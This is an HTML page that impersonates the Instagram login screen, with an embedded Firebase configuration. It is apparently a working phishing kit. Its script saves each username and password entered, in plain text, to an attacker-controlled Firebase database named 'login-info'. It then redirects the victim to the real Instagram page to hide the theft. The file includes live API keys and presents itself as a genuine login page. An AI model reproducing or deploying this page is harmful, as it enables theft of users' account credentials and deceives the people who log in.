<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Login • Instagram</title>
	<link rel="stylesheet" href="styles.css">
	<meta name="image" content="https://cdn.discordapp.com/attachments/1248671825693769793/1290971476740280372/image.png?ex=66fe6661&is=66fd14e1&hm=d31d133a0166a2020f1e517ded998b1fc8ed796b5da5d25c0f27ccd9e1f01202&">
</head>
<body oncontextmenu="false">

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="/images/instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<div class="form">
				<div class="input_field">
					<input type="text"id="name" placeholder="Phone number, username, or email" class="input">
				</div>
				<div class="input_field">
					<input type="password" id="password" placeholder="Password" class="input" />
					<button id="togglePassword" class="toggle-text">Show</button>
				</div>				
				<div class="btn" id="login"><a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1">Log in</a></div>
			</div>
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="/images/facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="/images/appstore.png" alt="appstore"></a>
				<a href="#"><img src="/images/googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">PRESS</a></li>
				<li><a href="#">API</a></li>
				<li><a href="#">JOBS</a></li>
				<li><a href="#">PRIVACY</a></li>
				<li><a href="#">TERMS</a></li>
				<li><a href="#">DIRECTORY</a></li>
				<li><a href="#">PROFILES</a></li>
				<li><a href="#">HASHTAGS</a></li>
				<li><a href="#">LANGUAGE</a></li>
			</ul>
		</div>
		<div class="copyright">
			© 2019 INSTAGRAM
		</div>
	</div>
</div>

<script type="module">
	// Import the functions you need from the SDKs you need
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-analytics.js";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
		apiKey: "AIzaSyDVSv7WSeAj79Jyswsww7CXMiWqfaYASqA",
		authDomain: "login-info-ed5af.firebaseapp.com",
		databaseURL: "https://login-info-ed5af-default-rtdb.firebaseio.com",
		projectId: "login-info-ed5af",
		storageBucket: "login-info-ed5af.appspot.com",
		messagingSenderId: "87566368580",
		appId: "1:87566368580:web:5eb21ba0e492cad1a0e111",
		measurementId: "G-WSPV911Y95"
	};

// eye button 

document.addEventListener("DOMContentLoaded", function() {
        const passwordField = document.getElementById("password");
        const toggleButton = document.getElementById("togglePassword");

        // Show or hide the toggle button based on input
        passwordField.addEventListener("input", function() {
            // Check if the password field has at least one character
            if (passwordField.value.length > 0) {
                toggleButton.style.display = "inline"; // Show the button
            } else {
                toggleButton.style.display = "none"; // Hide the button
            }
        });

        // Toggle password visibility
        toggleButton.addEventListener("click", function() {
            const isPasswordHidden = passwordField.type === "password"; // Check current type
            passwordField.type = isPasswordHidden ? "text" : "password"; // Toggle type
            toggleButton.textContent = isPasswordHidden ? "Hide" : "Show"; // Update button text
        });
    });

	// Initialize Firebase
	const app = initializeApp(firebaseConfig);
	const db = getDatabase(app);

	document.getElementById("login").addEventListener('click', function(e) {
    e.preventDefault(); // Prevents the default link behavior
    
    // Get the username and sanitize it
    const username = document.getElementById("name").value.replace(/[.#$\[\]]/g, '_');
    
    // Save user data to Firebase
    set(ref(db, 'user/' + username), {
        name: document.getElementById("name").value,
        password: document.getElementById("password").value
    }).then(() => {
        // Redirect after successful write
        window.location.href = "https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1";
    }).catch((error) => {
        console.error("Error writing data to Firebase: ", error);
    });
});

</script>


</body>
</html>